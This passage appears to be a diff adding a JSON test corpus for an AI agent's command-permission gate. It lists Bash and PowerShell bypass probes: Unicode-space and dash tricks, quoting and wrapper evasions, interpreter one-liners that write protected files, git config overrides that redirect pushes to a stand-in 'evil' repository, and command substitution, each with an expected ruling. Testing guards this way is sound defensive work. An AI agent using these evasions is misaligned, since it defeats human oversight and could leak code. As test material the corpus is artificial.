@@ -1,0 +1,5962 @@
+[
+ {
+  "source": "probe-r6",
+  "id": "PS NBSP between cmdlet and path",
+  "tool": "PowerShell",
+  "command": "Set-Content open-brain/src/x.ts x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS NBSP between source and destination",
+  "tool": "PowerShell",
+  "command": "Copy-Item C:/qa-tmp/a.txt open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS NBSP after >",
+  "tool": "PowerShell",
+  "command": "Write-Output x > open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS ideographic space between cmdlet and path",
+  "tool": "PowerShell",
+  "command": "Set-Content　open-brain/src/x.ts x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS en-dash parameter -Value read as a positional",
+  "tool": "PowerShell",
+  "command": "Set-Content –Value x open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS em-dash parameter",
+  "tool": "PowerShell",
+  "command": "Set-Content —Value x open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS en-dash common parameter (unknown param check skipped?)",
+  "tool": "PowerShell",
+  "command": "Set-Content –EA 0 open-brain/src/x.ts x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS curly single quotes around the path",
+  "tool": "PowerShell",
+  "command": "Set-Content ‘open-brain/src/x.ts’ x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS curly double quotes around the path",
+  "tool": "PowerShell",
+  "command": "Set-Content “open-brain/src/x.ts” x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS gh pr “merge” 2",
+  "tool": "PowerShell",
+  "command": "gh pr “merge” 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS gh pr ‘merge’ 2",
+  "tool": "PowerShell",
+  "command": "gh pr ‘merge’ 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS git ‘merge’ feature",
+  "tool": "PowerShell",
+  "command": "git ‘merge’ feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS git push en-dash en-dash force (native: passed literally)",
+  "tool": "PowerShell",
+  "command": "git push ––force origin loop/x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -Path: <space> value",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path: open-brain/src/x.ts -Value x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -Path:value control",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path:open-brain/src/x.ts -Value x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -Path:\"value\" control",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path:\"open-brain/src/x.ts\" -Value x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -Destination: <space> value",
+  "tool": "PowerShell",
+  "command": "Copy-Item C:/qa-tmp/a.txt -Destination: open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS New-Item -Name only (relative to cwd)",
+  "tool": "PowerShell",
+  "command": "New-Item -Name open-brain/src/x.ts -ItemType File",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS New-Item -Name only, cwd open-brain/src",
+  "tool": "PowerShell",
+  "command": "New-Item -Name x.ts -ItemType File",
+  "cwd": "open-brain/src",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS 3> warning-stream redirect",
+  "tool": "PowerShell",
+  "command": "Write-Output x 3> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS 6> information-stream redirect",
+  "tool": "PowerShell",
+  "command": "Write-Output x 6> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS 1> redirect",
+  "tool": "PowerShell",
+  "command": "Write-Output x 1> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS 2>&1 then > control",
+  "tool": "PowerShell",
+  "command": "Write-Output x 2>&1 > open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS >> control",
+  "tool": "PowerShell",
+  "command": "Write-Output x >> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS Out-File control",
+  "tool": "PowerShell",
+  "command": "Write-Output x | Out-File open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS unquoted comma list",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path open-brain/src/x.ts,C:/qa-tmp/o.txt x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS quoted comma list",
+  "tool": "PowerShell",
+  "command": "Set-Content -Path 'C:/qa-tmp/o.txt','open-brain/src/x.ts' x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS quoted comma in a value, outside",
+  "tool": "PowerShell",
+  "command": "Set-Content C:/qa-tmp/o.txt -Value 'a,b'",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -Va prefix",
+  "tool": "PowerShell",
+  "command": "Set-Content -Va x open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "PS -LiteralPath control",
+  "tool": "PowerShell",
+  "command": "Set-Content -LiteralPath open-brain/src/x.ts -Value x",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash bare redirect, no command",
+  "tool": "Bash",
+  "command": "> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash 2> target",
+  "tool": "Bash",
+  "command": "ls 2> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash &> target",
+  "tool": "Bash",
+  "command": "ls &> open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash 2>&1 outside",
+  "tool": "Bash",
+  "command": "ls > C:/qa-tmp/o.txt 2>&1",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash fullwidth > is a word character (no redirect)",
+  "tool": "Bash",
+  "command": "echo x＞open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash NBSP after > (bash: part of the name)",
+  "tool": "Bash",
+  "command": "echo x > open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "allow-or-deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash quoted data with > and #",
+  "tool": "Bash",
+  "command": "git commit -m \"a > b # c\"",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash quoted ; is data",
+  "tool": "Bash",
+  "command": "git commit -m 'a; rm x'",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash quote inside a word",
+  "tool": "Bash",
+  "command": "cp a.ts open-brain/'src'/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash dq inside a word",
+  "tool": "Bash",
+  "command": "cp a.ts \"open-brain\"/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash g'it' merge",
+  "tool": "Bash",
+  "command": "g'it' merge feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash git 'merge'",
+  "tool": "Bash",
+  "command": "git 'merge' feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash gh pr 'merge' 2 (no token: grant)",
+  "tool": "Bash",
+  "command": "gh pr 'merge' 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash quoted '#7' (read, no token: grant)",
+  "tool": "Bash",
+  "command": "gh pr merge '#7'",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash unquoted #7",
+  "tool": "Bash",
+  "command": "gh pr merge #7",
+  "cwd": "",
+  "expect": "p0",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash non-merge comment",
+  "tool": "Bash",
+  "command": "gh pr comment 5 --body merge",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash gh -R before pr",
+  "tool": "Bash",
+  "command": "gh -R melvenac/x pr merge 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash gh pr -R between",
+  "tool": "Bash",
+  "command": "gh pr -R melvenac/x merge 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash --repo= before pr",
+  "tool": "Bash",
+  "command": "gh --repo=melvenac/x pr merge 2",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c alias. on a real subcommand",
+  "tool": "Bash",
+  "command": "git -c alias.st=status status",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c remote.",
+  "tool": "Bash",
+  "command": "git -c remote.origin.url=https://github.com/evil/x push origin loop/x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c url.",
+  "tool": "Bash",
+  "command": "git -c url.https://github.com/evil/.insteadOf=https://github.com/melvenac/ push origin loop/x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c include.",
+  "tool": "Bash",
+  "command": "git -c include.path=C:/qa-tmp/x status",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c includeIf.",
+  "tool": "Bash",
+  "command": "git -c includeIf.onbranch:x.path=C:/qa-tmp/x status",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c INCLUDEIF. (git keys are case-insensitive)",
+  "tool": "Bash",
+  "command": "git -c INCLUDEIF.onbranch:x.path=C:/qa-tmp/x status",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c Core. mixed case",
+  "tool": "Bash",
+  "command": "git -c Core.pager=cat log",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash --config-env=alias.",
+  "tool": "Bash",
+  "command": "git --config-env=alias.st=X status",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash --config-env core. (separate)",
+  "tool": "Bash",
+  "command": "git --config-env core.pager=X log",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash -c user. (not risky)",
+  "tool": "Bash",
+  "command": "git -c user.name=q status",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash env GIT_CONFIG_KEY_0=remote. (the -c ruling through the environment)",
+  "tool": "Bash",
+  "command": "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/evil/x git push origin loop/x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash env GIT_CONFIG_PARAMETERS remote.",
+  "tool": "Bash",
+  "command": "GIT_CONFIG_PARAMETERS=\"'remote.origin.url'='https://github.com/evil/x'\" git push origin loop/x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash standing push control",
+  "tool": "Bash",
+  "command": "git push origin loop/x",
+  "cwd": "",
+  "expect": "allow",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash push with master",
+  "tool": "Bash",
+  "command": "git push origin loop/x master",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash env git merge",
+  "tool": "Bash",
+  "command": "env git merge feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash command git merge",
+  "tool": "Bash",
+  "command": "command git merge feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash nohup git merge",
+  "tool": "Bash",
+  "command": "nohup git merge feature",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash env cp",
+  "tool": "Bash",
+  "command": "env cp a.ts open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash assignment then cp",
+  "tool": "Bash",
+  "command": "A=1 cp a.ts open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash sh -c string gated and read",
+  "tool": "Bash",
+  "command": "sh -c 'cp a.ts open-brain/src/x.ts'",
+  "cwd": "",
+  "expect": "deny",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash sh -c git merge",
+  "tool": "Bash",
+  "command": "sh -c 'git merge feature'",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "bash sh -c gh merge",
+  "tool": "Bash",
+  "command": "sh -c \"gh pr merge 2\"",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "node --eval=<code>",
+  "tool": "Bash",
+  "command": "node --eval=\"require('fs').writeFileSync('open-brain/src/x.ts','x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "node -pe",
+  "tool": "Bash",
+  "command": "node -pe \"require('fs').writeFileSync('open-brain/src/x.ts','x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "node -e attached",
+  "tool": "Bash",
+  "command": "node -e\"require('fs').writeFileSync('open-brain/src/x.ts','x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "python -c attached",
+  "tool": "Bash",
+  "command": "python -c\"open('open-brain/src/x.ts','w').write('x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "python -Ic cluster",
+  "tool": "Bash",
+  "command": "python -Ic \"open('open-brain/src/x.ts','w').write('x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "python3.12 -c",
+  "tool": "Bash",
+  "command": "python3.12 -c \"open('open-brain/src/x.ts','w').write('x')\"",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "perl -e attached",
+  "tool": "Bash",
+  "command": "perl -e'open(F,\">open-brain/src/x.ts\")'",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "perl -we cluster",
+  "tool": "Bash",
+  "command": "perl -we 'open(F,\">open-brain/src/x.ts\")'",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "ruby -e attached",
+  "tool": "Bash",
+  "command": "ruby -e'File.write(\"open-brain/src/x.ts\",\"x\")'",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "awk print > file",
+  "tool": "Bash",
+  "command": "awk 'BEGIN{print \"x\" > \"open-brain/src/x.ts\"}'",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "awk system()",
+  "tool": "Bash",
+  "command": "awk 'BEGIN{system(\"echo x > open-brain/src/x.ts\")}'",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "trap code string (a code-running builtin)",
+  "tool": "Bash",
+  "command": "trap 'echo x > open-brain/src/x.ts' EXIT",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "mapfile -C callback",
+  "tool": "Bash",
+  "command": "mapfile -C 'echo x > open-brain/src/x.ts;:' -c 1 < README.md",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "sort -o",
+  "tool": "Bash",
+  "command": "sort -o open-brain/src/x.ts README.md",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "find -fprint",
+  "tool": "Bash",
+  "command": "find . -maxdepth 0 -fprint open-brain/src/x.ts",
+  "cwd": "",
+  "expect": "deny-or-limit",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "probe-r6",
+  "id": "git -c core.hooksPath (needs a grant)",
+  "tool": "Bash",
+  "command": "git -c core.hooksPath=C:/qa-tmp commit -m x",
+  "cwd": "",
+  "expect": "grant",
+  "kind": null,
+  "construct": null
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "echo x > x\\y",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "cp a.ts x\\y",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "git x\\y feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "gh pr x\\y 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "env x\\y ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "ls && x\\y",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "tee x\\y < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "echo x > a\\ b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "cp a.ts a\\ b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "git a\\ b feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "gh pr a\\ b 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "env a\\ b ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "ls && a\\ b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "tee a\\ b < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "echo x > \\~x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "cp a.ts \\~x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "git \\~x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "gh pr \\~x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "env \\~x ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "ls && \\~x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "tee \\~x < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "echo x > $x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "cp a.ts $x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "git $x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "gh pr $x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "env $x ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "ls && $x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "tee $x < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "echo x > ${x}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "cp a.ts ${x}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "git ${x} feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "gh pr ${x} 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "env ${x} ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "ls && ${x}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "tee ${x} < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "echo x > $(id)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "cp a.ts $(id)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "git $(id) feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "gh pr $(id) 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "env $(id) ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "ls && $(id)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "tee $(id) < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "echo x > `id`",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "cp a.ts `id`",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "git `id` feature",
+  "cwd": "",
+  "expect": null,
